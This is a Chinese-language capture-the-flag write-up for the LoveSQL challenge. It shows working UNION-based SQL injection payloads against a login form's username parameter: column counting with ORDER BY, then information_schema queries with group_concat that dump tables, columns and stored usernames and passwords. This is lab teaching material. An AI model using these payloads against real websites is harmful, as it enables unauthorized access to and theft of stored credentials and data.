---

# [极客大挑战 2019]LoveSQL 1

一个登录界面
![LoveSQL.png](https://i-blog.csdnimg.cn/blog_migrate/c40c0f04ba36a31811accce92b21cd6a.png)
输入用户名和密码，url 变成

```http
http://636437fd-3fef-4b6a-b088-41fa2c25c1a2.node5.buuoj.cn:81/check.php?username=1&password=1
```

- `636437fd-3fef-4b6a-b088-41fa2c25c1a2.node5.buuoj.cn`是服务器的 IP 地址
- `81`是服务器的端口号
- `check.php`是服务器上的一个 PHP 脚本
- `username`和`password`是表单提交的用户名和密码
  注入点在于`username`和`password`参数
  以下注入在`username`参数上进行，`password=1`

## 确定有 SQL 注入漏洞

输入单引号`'`，返回结果

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1'' at line 1
```

存在 SQL 注入漏洞，可以尝试使用`UNION SELECT`命令进行注入

## order by 确认查询字段数

```sql
# payload
1' order by 4#
# 返回结果：Unknown column '4' in 'order clause'
1' order by 3#
# 返回结果：NO,Wrong username password！！！
```

说明有**3 个字段**

## 寻找注入点

```sql
# payload
1' union select 1,2,3#
# 返回结果：
Login Success!
Hello 2！
Your password is '3'
```

2、3 是注入点，尝试使用`union select`命令进行注入

## `union select`命令进行注入

### 查数据库名、表名

```sql
payload: 1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#
# 返回结果：
Login Success!
Hello geek！
Your password is 'geekuser,l0ve1ysq1'
```

- 数据库名称`geek`
- 两个表名`geekuser,l0ve1ysq1`

在 payload 中

- `database()`函数返回当前数据库名
- `where table_schema=database()`,这样就不用指定具体的数据库名，之前还多查一次数据库名记下来，现在不需要了
- `group_concat(table_name)`函数一次返回所有表名(用 concat 只返回第一个表名，limit 还需要一次次查询，麻烦)

### 查列名

```sql
payload:
1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#
# 返回结果：
Login Success!
Hello 2！
Your password is 'id,username,password'
```

有 3 列`id,username,password`

### 查数据

```sql
payload:
1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
# 返回结果：
Login Success!
Hello 2！
Your password is '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{d69b64fd-6051-4bc8-94f9-e3bb31f48a58}'
```

输出了`l0ve1ysq1`表中`id,username,password`三列的所有数据，最后一条就是 flag

## 总结

1. `database()、user()、version()`这类函数可以直接放入命令执行
   - `database()`可以替代数据库名，不需要先把数据库名找出来就能用,
   - 比如过滤条件`where table_schema=database()`
2. 在只能一次一次输出数据的时候
   - `group_concat()`函数可以一次返回所有数据
   - `group_concat(table_name)`可以返回所有表名
   - `group_concat(column_name)`可以返回所有列名
   - `group_concat(id,username,password)`可以返回三列的所有数据
